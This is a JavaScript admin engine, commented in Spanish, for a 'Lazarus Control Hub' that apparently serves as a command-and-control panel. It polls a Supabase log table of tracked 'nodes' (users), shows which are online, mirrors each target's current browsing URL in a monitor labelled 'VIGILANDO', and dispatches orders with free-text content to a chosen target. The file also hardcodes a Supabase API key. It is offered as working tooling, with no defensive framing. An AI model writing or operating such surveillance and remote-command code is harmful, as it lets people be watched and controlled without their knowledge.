/**
 * LAZARUS CONTROL HUB - ADMIN ENGINE
 * Gestión de Nodos, Vigilancia y Despacho de Comandos.
 */

const CONFIG = {
    URL: "https://gmvczheriaqouwynfdyv.supabase.co",
    KEY: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs"
};

let activeTarget = null;
let cachedUrl = "";

/**
 * SINCRONIZACIÓN DE NODOS (Usuarios)
 * Filtra para que solo aparezcan los dispositivos que han enviado señales hoy.
 */
async function syncNodes() {
    try {
        // Obtenemos los últimos 100 logs para asegurar que no perdemos a nadie
        const response = await fetch(`${CONFIG.URL}/rest/v1/logs?select=*&order=timestamp.desc&limit=100`, {
            headers: { 'apikey': CONFIG.KEY }
        });
        const data = await response.json();

        if (!data || data.length === 0) {
            updateStatus("ESPERANDO SEÑAL...");
            return;
        }

        // Mapeo de Usuarios Únicos (Solo el log más reciente)
        const nodeCollection = new Map();
        data.forEach(entry => {
            if (!nodeCollection.has(entry.usuario_id)) {
                nodeCollection.set(entry.usuario_id, entry);
            }
        });

        renderUserList(nodeCollection);
        processLiveFeed(nodeCollection);

    } catch (e) {
        console.error("Hub Error:", e);
    }
}

function renderUserList(map) {
    const container = document.getElementById('nodes-container'); // Cambia al ID de tu HTML
    const nodes = Array.from(map.values());
    
    document.getElementById('count-display').innerText = nodes.length;

    container.innerHTML = nodes.map(node => {
        const isOnline = (new Date() - new Date(node.timestamp)) < 15000; // Verde si hace < 15s
        return `
            <div class="user-item ${activeTarget === node.usuario_id ? 'active' : ''}" 
                 onclick="selectTarget('${node.usuario_id}')">
                <div class="status-dot" style="background: ${isOnline ? '#00ff88' : '#555'}"></div>
                <div class="user-info">
                    <span class="uid">${node.usuario_id}</span><br>
                    <small class="u-url">${node.url_actual.substring(0, 30)}</small>
                </div>
            </div>
        `;
    }).join('');
}

function processLiveFeed(map) {
    if (!activeTarget) return;

    const targetData = map.get(activeTarget);
    if (targetData && targetData.url_actual !== cachedUrl) {
        cachedUrl = targetData.url_actual;
        const monitor = document.getElementById('main-monitor');
        monitor.src = targetData.url_actual;
        document.getElementById('current-target-label').innerText = "VIGILANDO: " + activeTarget;
    }
}

function selectTarget(id) {
    activeTarget = id;
    cachedUrl = ""; // Forzar refresco de monitor
    syncNodes();
}

/**
 * DESPACHO DE ÓRDENES
 */
async function sendCommand(type) {
    if (!activeTarget) return alert("Selecciona un nodo primero.");
    
    const content = document.getElementById('cmd-input').value;
    
    await fetch(`${CONFIG.URL}/rest/v1/ordenes`, {
        method: 'POST',
        headers: { 
            'apikey': CONFIG.KEY, 
            'Content-Type': 'application/json' 
        },
        body: JSON.stringify({
            usuario_id: activeTarget,
            orden: type,
            contenido: content,
            activa: true
        })
    });
    alert("Orden " + type + " despachada.");
}

// Actualización cada 3 segundos
setInterval(syncNodes, 3000);
syncNodes();
